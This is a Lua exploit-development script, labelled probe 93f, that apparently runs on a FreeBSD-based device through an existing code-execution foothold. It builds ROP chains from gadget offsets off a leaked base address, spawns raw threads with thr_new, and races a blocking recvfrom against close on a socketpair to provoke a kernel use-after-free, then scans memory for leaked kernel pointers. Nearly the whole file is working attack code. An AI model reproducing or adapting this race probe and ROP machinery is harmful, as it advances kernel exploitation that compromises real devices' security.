-- CRASH_CLASS: MODERATE
-- PROBE 93f: blocking socket op vs close race
--
-- Previous probes failed because the main thread's syscall completes
-- before the child's close. This probe uses a BLOCKING recvfrom on an
-- empty socket from a CHILD thread, while another child closes the fd.
-- Both children start simultaneously via thr_new. The blocking child
-- is guaranteed to be inside the kernel when the close happens.
--
-- Strategy: child A blocks on recvfrom(fd), child B delays then close(fd).
-- If close frees the socket while recvfrom holds a reference, we get UAF.

print("=== PROBE 93f: BLOCKING CLOSE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local prc_lo, prc_hi = eoff(0xE64)
local pr8_lo, pr8_hi = eoff(0x991)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x1000)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 0xFF8, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)
    for _, c in ipairs(calls) do
        if #c >= 2 then put(pdr_lo, pdr_hi); local l,h = split(c[2]); put(l, h) end
        if #c >= 3 then put(psr_lo, psr_hi); local l,h = split(c[3]); put(l, h) end
        if #c >= 4 then put(prdx_lo, prdx_hi); local l,h = split(c[4]); put(l, h) end
        if #c >= 5 then put(prc_lo, prc_hi); local l,h = split(c[5]); put(l, h) end
        if #c >= 6 then put(pr8_lo, pr8_hi); local l,h = split(c[6]); put(l, h) end
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end
    put(par_lo, par_hi); put(0xD09E93F0, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

local function wait_done(done, ms)
    for w = 1, ms * 10 do if (rd(N(done)) or 0) ~= 0 then return true end end
    return false
end

print("setup done")

-- Strategy: for each iteration
-- 1. Create AF_UNIX SOCK_DGRAM socketpair (fd0, fd1)
-- 2. Child A: blocking recvfrom(fd1, buf, 64, 0) - will block since no data
-- 3. Child B: close(fd1) after short delay
-- 4. Main: wait, then check if process is alive and scan result buffer

local anomalies = 0

for iter = 1, 15 do
    if not alive() then print("DEAD iter=" .. iter); break end

    -- Create socketpair
    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1
    local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then print("NOPAIR " .. iter); break end

    -- Result buffer for child A's recvfrom - fill with sentinels
    local rbuf = memory.alloc(128)
    for j = 0, 124, 4 do wd(N(rbuf)+j, 0xBEEF0000+j) end

    -- Return value storage for child A
    local ret_a = memory.alloc(8); wd(N(ret_a), 0x7F7F7F7F)

    local done_a = memory.alloc(8); wd(N(done_a), 0)
    local done_b = memory.alloc(8); wd(N(done_b), 0)

    -- Child A: blocking recvfrom(fd1, rbuf, 64, 0)
    -- recvfrom is syscall 29: recvfrom(fd, buf, len, flags, from, fromlenaddr)
    local rbuf_lo, rbuf_hi = split(N(rbuf))
    local ret_a_lo, ret_a_hi = split(N(ret_a))
    local child_a_calls = {
        {29, fd1, N(rbuf), 64, 0, 0}  -- recvfrom(fd1, rbuf, 64, 0, NULL, NULL)
    }
    -- After recvfrom returns (either with data or error from close),
    -- store rax (return value) to ret_a via mov [rdi],rax;ret
    -- But we can't easily capture rax after the syscall in the ROP chain.
    -- Instead, just let the child complete and check if it crashed.

    local ok_a = spawn_child(child_a_calls, N(done_a))
    if not ok_a then
        print("NOSPAWN_A " .. iter)
        pcall(function() mk(6)(uint64(fd0)) end)
        pcall(function() mk(6)(uint64(fd1)) end)
        break
    end

    -- Child B: delay then close(fd1)
    -- More delay = more likely child A is blocked in recvfrom
    local child_b_calls = {}
    for d = 1, 20 do
        table.insert(child_b_calls, {20})  -- 20 getpid calls as delay
    end
    table.insert(child_b_calls, {6, fd1})  -- close(fd1)

    local ok_b = spawn_child(child_b_calls, N(done_b))
    if not ok_b then
        print("NOSPAWN_B " .. iter)
        pcall(function() mk(6)(uint64(fd0)) end)
        pcall(function() mk(6)(uint64(fd1)) end)
        break
    end

    -- Wait for child B to finish (it has the close)
    local b_done = wait_done(done_b, 10000)
    -- Child A should unblock once fd1 is closed (or be stuck)
    local a_done = wait_done(done_a, 5000)

    -- Check if process survived
    local still_alive = alive()

    -- Scan rbuf for kernel pointers (if recvfrom wrote something unexpected)
    local kptrs = 0
    for j = 0, 120, 4 do
        local lo = rd(N(rbuf)+j) or 0
        local hi = rd(N(rbuf)+j+4) or 0
        if lo < 0 then lo = lo + 0x100000000 end
        if hi < 0 then hi = hi + 0x100000000 end
        if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
            print(string.format("  %d KPTR +%02X: 0x%08X%08X", iter, j, hi, lo))
            kptrs = kptrs + 1
        end
    end

    -- Check if sentinels were modified (recvfrom wrote something)
    local modified = 0
    for j = 0, 60, 4 do
        local v = rd(N(rbuf)+j) or 0
        if v < 0 then v = v + 0x100000000 end
        if v ~= 0xBEEF0000+j then modified = modified + 1 end
    end

    if kptrs > 0 or modified > 0 or not still_alive then
        print(string.format("  %d: kptrs=%d mod=%d alive=%s a=%s b=%s",
            iter, kptrs, modified, tostring(still_alive),
            tostring(a_done), tostring(b_done)))
        anomalies = anomalies + 1
    end

    -- Cleanup
    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end

print("")
print(string.format("anomalies=%d", anomalies))
print("alive=" .. tostring(alive()))
print("=== 93f COMPLETE ===")
